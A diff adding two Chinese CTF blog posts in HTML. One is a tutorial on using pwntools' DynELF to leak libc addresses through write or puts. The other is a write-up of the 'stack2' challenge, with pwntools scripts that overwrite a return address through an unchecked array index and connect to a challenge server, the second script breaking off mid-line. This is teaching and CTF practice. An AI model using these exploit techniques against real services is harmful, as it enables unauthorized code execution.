@@ -251,6 +251,325 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/30/DynELF的应用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xfgg">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xfgg">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/30/DynELF的应用/" itemprop="url">DynELF的应用</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-30T10:17:49+08:00">
+                2019-07-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/理论知识/" itemprop="url" rel="index">
+                    <span itemprop="name">理论知识</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>原文：<a href="http://bobao.360.cn/learning/detail/3298.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3298.html</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在没有目标系统libc文件的情况下，我们可以使用pwntools的DynELF模块来泄漏地址信息，从而获取到shell。本文针对linux下的puts和write，分别给出了实现DynELF关键函数leak的方法，并通过3道CTF题目介绍了这些方法的具体应用情况。</span><br></pre></td></tr></table></figure>
+
+<h3 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./xxx'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">#各种预处理</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  payload = <span class="string">"xxxxxxxx"</span> + address + <span class="string">"xxxxxxxx"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">#各种处理</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  data = p.recv(4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  log.debug(<span class="string">"%#x =&gt; %s"</span> % (address, (data or <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">"./xxx"</span>))      <span class="comment">#初始化DynELF模块 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">systemAddress = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)  <span class="comment">#在libc文件中搜索system函数的地址</span></span><br><span class="line"></span><br><span class="line">需要使用者进行的工作主要集中在leak函数的具体实现上，上面的代码只是个模板。其中，address就是leak函数要泄漏信息的所在地址，而payload就是触发目标程序泄漏address处信息的攻击代码。</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">不管有没有libc文件，要想获得目标系统的system函数地址，首先都要求目标二进制程序中存在一个能够泄漏目标系统内存中libc空间内信息的漏洞。同时，由于我们是在对方内存中不断搜索地址信息，故我们需要这样的信息泄露漏洞能够被反复调用。以下是大致归纳的主要使用条件：</span><br><span class="line">1）目标程序存在可以泄露libc空间信息的漏洞，如<span class="built_in">read</span>@got就指向libc地址空间内；</span><br><span class="line"></span><br><span class="line">2）目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。</span><br><span class="line"></span><br><span class="line">当然，以上仅仅是实现利用的基本条件，不同的目标程序和运行环境都会有一些坑需要绕过。接下来，我们主要针对write和puts这两个普遍用来泄漏信息的函数在实际配合DynELF工作时可能遇到的问题，给出相应的解决方法。</span><br></pre></td></tr></table></figure>
+
+<h3 id="write函数"><a href="#write函数" class="headerlink" title="write函数"></a>write函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。write函数的优点是可以读取任意长度的内存信息，即它的打印长度只受len参数控制，缺点是需要传递3个参数，特别是在x64环境下，可能会带来一些困扰。</span><br><span class="line">在x64环境下，函数的参数是通过寄存器传递的，rdi对应第一个参数，rsi对应第二个参数，rdx对应第三个参数，往往凑不出类似“pop rdi; ret”、“pop rsi; ret”、“pop rdx; ret”等3个传参的gadget。此时，可以考虑使用__libc_csu_init函数的通用gadget，具体原理请参见文章。简单的说，就是通过__libc_csu_init函数的两段代码来实现3个参数的传递，这两段代码普遍存在于x64二进制程序中，只不过是间接地传递参数，而不像原来，是通过pop指令直接传递参数。</span><br><span class="line"></span><br><span class="line">.text:000000000040075A   pop  rbx  <span class="comment">#需置为0，为配合第二段代码的call指令寻址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:000000000040075B   pop  rbp  <span class="comment">#需置为1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:000000000040075C   pop  r12  <span class="comment">#需置为要调用的函数地址，注意是got地址而不是plt地址，因为第二段代码中是call指令</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:000000000040075E   pop  r13  <span class="comment">#write函数的第三个参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400760   pop  r14  <span class="comment">#write函数的第二个参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400762   pop  r15  <span class="comment">#write函数的第一个参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400764   retn</span><br><span class="line"></span><br><span class="line">第二段代码如下</span><br><span class="line"></span><br><span class="line">.text:0000000000400740   mov  rdx, r13</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400743   mov  rsi, r14</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400746   mov  edi, r15d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400749   call  qword ptr [r12+rbx*8]</span><br><span class="line"></span><br><span class="line">这两段代码运行后，会将栈顶指针移动56字节，我们在栈中布置56个字节即可。</span><br><span class="line"></span><br><span class="line">这样，我们便解决了write函数在leak信息中存在的问题，具体的应用会放到后面的3道题目中讲。</span><br></pre></td></tr></table></figure>
+
+<h3 id="puts函数"><a href="#puts函数" class="headerlink" title="puts函数"></a>puts函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“\x00”字符为止。也就是说，puts函数输出的数据长度是不受控的，只要我们输出的信息中包含\x00截断符，输出就会终止，且会自动将“\n”追加到输出字符串的末尾，这是puts函数的缺点，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。</span><br><span class="line">为了克服输入不受控这一缺点，我们考虑利用puts函数输出的字符串最后一位为“\n“这一特点，分两种情况来解决。</span><br><span class="line"></span><br><span class="line">（1）puts输出完后就没有其他输出，在这种情况下的leak函数可以这么写。</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  count = 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  payload = xxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span> p.recvuntil(<span class="string">'xxx\n'</span>) <span class="comment">#一定要在puts前释放完输出</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  up = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> True:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待1秒钟，如果确实接收不到了，就说明输出结束了</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    c = p.recv(numb=1, timeout=1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    count += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">'\n'</span> and c == <span class="string">""</span>:  <span class="comment">#接收到的上一个字符为回车符，而当前接收不到新字符，则</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      buf = buf[:-1]             <span class="comment">#删除puts函数输出的末尾回车符</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      buf += <span class="string">"\x00"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      buf += c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    up = c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  data = buf[:4]  <span class="comment">#取指定字节数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  log.info(<span class="string">"%#x =&gt; %s"</span> % (address, (data or <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">return</span> data</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">puts输出完后还有其他输出，在这种情况下的leak函数可以这么写。</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  count = 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  data = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  payload = xxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span> p.recvuntil(<span class="string">"xxx\n"</span>)) <span class="comment">#一定要在puts前释放完输出</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  up = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> True:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    c = p.recv(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    count += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">'\n'</span> and c == <span class="string">"x"</span>:  <span class="comment">#一定要找到泄漏信息的字符串特征</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      data = buf[:-1]                     </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      data += <span class="string">"\x00"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      buf += c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    up = c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  data = buf[:4] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  log.info(<span class="string">"%#x =&gt; %s"</span> % (address, (data or <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">return</span> data</span><br></pre></td></tr></table></figure>
+
+<h3 id="其他需要注意的"><a href="#其他需要注意的" class="headerlink" title="其他需要注意的"></a>其他需要注意的</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在信息泄露过程中，由于循环制造溢出，故可能会导致栈结构发生不可预料的变化，可以尝试调用目标二进制程序的_start函数来重新开始程序以恢复栈</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/28/stack2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xfgg">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xfgg">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/28/stack2/" itemprop="url">stack2</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-28T20:07:22+08:00">
+                2019-07-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/攻防世界/" itemprop="url" rel="index">
+                    <span itemprop="name">攻防世界</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec stack2</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/stack2'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br><span class="line">    可能要用到canary绕过</span><br><span class="line">    ida分析</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190122193700704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">限制了 输入的数量是99</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190122193737266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里就是bug了    因为我们没有检查v13数组的边界 这里我们可以随意输入  然后劫持程序eip  </span><br><span class="line"></span><br><span class="line">然后观察 哪里有system_addr   就ok了 但是 这里输入的是数字 好像有点麻烦</span><br><span class="line"></span><br><span class="line">因为v13 是char 类型的数组 然后我们试着输入一下</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190123100418248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后去栈会发现,这个操作可以用gdb一步步ni下去</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190123100437224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">这里其实应该能够注意得到  栈是小段模式  那么我们输入的时候 可以是 反着来  比如地址是 12345678  先输入78 45 34  12  </span><br><span class="line"></span><br><span class="line">才能返回 正确的地址 然后 我们观察一下 哪里有我们system 的地址    </span><br><span class="line"></span><br><span class="line">然后我们发现 本次（这个是会变化的  注意是我这次 运行的） 我们的返回地址FFCF77AC  而我们输入的地址是   FFCF7728  </span><br><span class="line"></span><br><span class="line">那么偏移就是 0x84  然后之后我们找到 system_addr 就ok了  </span><br><span class="line"></span><br><span class="line">然后就找到了  system_addr</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190123101625553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 但是感觉这里/bin/bash 有点怪怪的啊~~~</span><br><span class="line"></span><br><span class="line">先不管 我们试试</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"> </span><br><span class="line">from pwn import*</span><br><span class="line"> </span><br><span class="line">	</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">system_addr=0x080485AF</span><br><span class="line">leave_offset=0x84</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def write_addr(addr,va):</span><br><span class="line">	io.sendline(<span class="string">"3"</span>)</span><br><span class="line">	io.recvuntil(<span class="string">"which number to change:\n"</span>)</span><br><span class="line">	io.sendline(str(addr))</span><br><span class="line">	io.recvuntil(<span class="string">"new number:\n"</span>)</span><br><span class="line">	io.sendline(str(va))</span><br><span class="line">	io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"> </span><br><span class="line">io=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'31725'</span>)</span><br><span class="line">io.recvuntil(<span class="string">"How many numbers you have:\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Give me your numbers\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># write  system_addr</span></span><br><span class="line"> </span><br><span class="line">write_addr(leave_offset,0XAF)</span><br><span class="line">write_addr(leave_offset+1,0X85)</span><br><span class="line">write_addr(leave_offset+2,0X04)</span><br><span class="line">write_addr(leave_offset+3,0X08)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">io.sendline(<span class="string">"5"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于题目的问题所以需要我们自己写入sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数组下标超界问题</span><br></pre></td></tr></table></figure>
+
+<p>###exp</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"> </span><br><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">system_addr=0x080485AF</span><br><span class="line">leave_offset=0x84</span><br><span class="line">io = remote(<span class="string">'111.198.29.45'</span>,<span class="string">'47978'</span>) </span><br><span class="line"></span><br><span class="line">def write_addr(addr,va):</span><br><span class="line">	io.sendline(<span class="string">"3"</span>)</span><br><span class="line">	io.recvuntil(<span class="string">"which number to change:\n"</span>)</span><br><span class="line">	io.sendline(str(addr))</span><br><span class="line">	io.recvuntil(<span class="string">"new number:\n"</span>)</span><br><span class="line">	io.sendline(str(va))</span><br><span class="line">	io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">"How many numbers you have:\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Give me your numbers\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span 